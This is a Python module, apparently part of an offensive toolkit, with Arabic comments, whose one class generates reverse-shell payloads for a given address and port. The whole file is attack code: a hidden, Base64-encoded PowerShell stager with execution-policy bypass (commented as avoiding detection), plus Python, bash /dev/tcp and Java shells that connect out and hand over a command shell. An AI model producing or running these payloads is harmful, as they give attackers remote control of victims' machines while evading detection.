import base64
import random
from typing import Dict, Any

class PayloadModule:
    """وحدة توليد الحمولات"""
    
    def __init__(self, config):
        self.config = config
    
    async def generate(self, language: str, ip: str, port: int) -> str:
        """توليد حمولة باللغة المطلوبة"""
        methods = {
            "powershell": self.powershell_stager,
            "python": self.python_reverse_shell,
            "bash": self.bash_reverse_shell,
            "java": self.java_reverse_shell,
        }
        
        if language not in methods:
            raise ValueError(f"لغة غير مدعومة: {language}")
        
        return await methods[language](ip, port)
    
    async def powershell_stager(self, ip: str, port: int) -> str:
        """حمولة PowerShell"""
        raw = f"""
$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}}
$client.Close()
"""
        # تشفير Base64 لتجنب الكشف
        encoded = base64.b64encode(raw.encode()).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
    
    async def python_reverse_shell(self, ip: str, port: int) -> str:
        """حمولة Python"""
        return f"""
import socket,subprocess,os,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{ip}',{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
"""
    
    async def bash_reverse_shell(self, ip: str, port: int) -> str:
        """حمولة Bash"""
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    
    async def java_reverse_shell(self, ip: str, port: int) -> str:
        """حمولة Java"""
        return f"""
public class ReverseShell {{
    public static void main(String[] args) throws Exception {{
        Process p = Runtime.getRuntime().exec("/bin/sh");
        java.io.InputStream in = p.getInputStream();
        java.io.OutputStream out = p.getOutputStream();
        java.net.Socket s = new java.net.Socket("{ip}", {port});
        java.io.InputStream sin = s.getInputStream();
        java.io.OutputStream sout = s.getOutputStream();
        Thread t1 = new Thread(() -> {{
            try {{
                int c;
                while ((c = in.read()) != -1) sout.write(c);
            }} catch (Exception e) {{}}
        }});
        t1.start();
        int c;
        while ((c = sin.read()) != -1) out.write(c);
    }}
}}
"""